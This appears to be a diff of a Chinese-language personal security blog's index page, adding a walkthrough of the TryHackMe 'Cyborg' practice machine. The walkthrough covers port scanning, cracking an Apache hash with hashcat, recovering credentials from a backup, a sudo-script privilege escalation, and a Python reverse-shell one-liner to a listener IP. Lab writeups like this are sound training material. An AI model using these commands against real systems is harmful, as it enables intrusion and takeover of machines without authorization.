@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -150,6 +150,135 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/20/Cyborg-Try-Hack-ME%E9%9D%B6%E6%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sCh3n">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sCh3n's Blog">
+      <meta itemprop="description" content="一个不入流摆狗密码手">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | sCh3n's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/03/20/Cyborg-Try-Hack-ME%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Cyborg | Try Hack ME靶机</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-03-20 13:51:19 / 修改时间：16:22:50" itemprop="dateCreated datePublished" datetime="2024-03-20T13:51:19+08:00">2024-03-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/TryHackME/" itemprop="url" rel="index"><span itemprop="name">TryHackME</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="cyborg-try-hack-me靶机">Cyborg | Try Hack ME靶机</h2>
+<p><code>nmap -sV 10.10.133.164</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>开了22端口，openssh版本7.2，搜一下，有个用户名遍历洞</p>
+<p>80端口扫了一下目录，只有/admin和/etc</p>
+<p>先看/etc，下面有个passwd，打开是<code>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.</code></p>
+<p>cmd5能查到要付费，hashes.com查不到，拿hashcat跑一下看看</p>
+<p>hash类型：<code>$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. - Possible algorithms: Apache $apr1$ MD5, md5apr1, MD5 (APR)</code>，在hashcat的类型为1600</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1600 &#x27;$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.&#x27; /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">apr1<span class="variable">$BpZ</span>.Q.1m<span class="variable">$F0qqPwHSOG50URuOVQTTn</span>.:squidward</span></span><br></pre></td></tr></table></figure>
+<p>再看/admin，archive下面有个download，下载下来一个archive.tar，解压出来看了下是个<code>Borg Backup</code>，version应该是1.0</p>
+<figure>
+<img src="/images/Cyborg-Try-Hack-ME靶机/image-20240320154014105.png"
+alt="image-20240320154014105" />
+<figcaption aria-hidden="true">image-20240320154014105</figcaption>
+</figure>
+<p>可以直接安装</p>
+<figure>
+<img src="/images/Cyborg-Try-Hack-ME靶机/image-20240320154726401.png"
+alt="image-20240320154726401" />
+<figcaption aria-hidden="true">image-20240320154726401</figcaption>
+</figure>
+<p>解出来一个alex文件夹，里面类似桌面，尝试ssh登录alex用户，没登进去</p>
+<p>发现Documents文件夹里有个note.txt记录了密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Wow I&#x27;m awful at remembering Passwords so I&#x27;ve taken my Friends advice and noting them down!</span><br><span class="line"></span><br><span class="line">alex:S3cretP@s3</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/images/Cyborg-Try-Hack-ME靶机/image-20240320155111455.png"
+alt="image-20240320155111455" />
+<figcaption aria-hidden="true">image-20240320155111455</figcaption>
+</figure>
+<p>查找SUID程序</p>
+<figure>
+<img src="/images/Cyborg-Try-Hack-ME靶机/image-20240320155453608.png"
+alt="image-20240320155453608" />
+<figcaption aria-hidden="true">image-20240320155453608</figcaption>
+</figure>
+<p>有pkexec，版本也是0.105，参考<a
+href="/Blog%20-Try%20Hack%20ME%E9%9D%B6%E6%9C%BA/">Blog</a>，msfvenom起个sessions再打CVE-2021-4034就行</p>
+<p>sudo -l查看有sudo权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alex@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries for alex on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alex may run the following commands on ubuntu:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh</span><br><span class="line">alex@ubuntu:~$ ls -al /etc/mp3backups</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x   2 root root  4096 Dec 30  2020 .</span><br><span class="line">drwxr-xr-x 133 root root 12288 Dec 31  2020 ..</span><br><span class="line">-rw-r--r--   1 root root   339 Mar 20 00:59 backed_up_files.txt</span><br><span class="line">-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh</span><br><span class="line">-rw-r--r--   1 root root    45 Mar 20 00:59 ubuntu-scheduled.tgz</span><br></pre></td></tr></table></figure>
+<p>文件所有者是alex，给个777直接修改</p>
+<p>python3 反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;10.9.224.253&quot;,1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/images/Cyborg-Try-Hack-ME靶机/image-20240320162154872.png"
+alt="image-20240320162154872" />
+<figcaption aria-hidden="true">image-20240320162154872</figcaption>
+</figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -999,102 +1128,6 @@ ME靶机</h2>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/04/20/2023%E7%BA%A2%E6%98%8E%E8%B0%B7WriteUp/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/04/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WriteUp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sCh3n">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="sCh3n's Blog">
-      <meta itemprop="description" content="一个不入流摆狗密码手">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | sCh3n's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/04/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WriteUp/" class="post-title-link" itemprop="url">2022西湖论剑WriteUp</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-04 10:58:59" itemprop="dateCreated datePublished" datetime="2023-02-04T10:58:59+08:00">2023-02-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-18 18:58:28" itemprop="dateModified" datetime="2024-03-18T18:58:28+08:00">2024-03-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Crypto/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="西湖论剑writeup">2022西湖论剑WriteUp</h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/04/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WriteUp/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
